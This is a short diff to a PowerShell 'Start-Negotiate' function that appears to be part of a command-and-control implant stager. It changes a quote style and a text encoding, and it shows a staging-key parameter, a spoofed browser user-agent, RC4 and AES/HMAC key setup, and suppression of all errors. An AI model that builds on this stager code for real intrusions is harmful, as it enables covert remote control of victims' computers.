@@ -1,5 +1,5 @@
 function Start-Negotiate {
-    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
+    param($s,$SK,$UA="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
     
     function ConvertTo-RC4ByteStream {
         Param ($RCK, $In)
@@ -57,7 +57,7 @@ function Start-Negotiate {
 
     # try to ignore all errors
     $ErrorActionPreference = "SilentlyContinue";
-    $e=[System.Text.Encoding]::ASCII;
+    $e=[System.Text.Encoding]::UTF8;
     $customHeaders = "";
     $SKB=$e.GetBytes($SK);
     # set up the AES/HMAC crypto
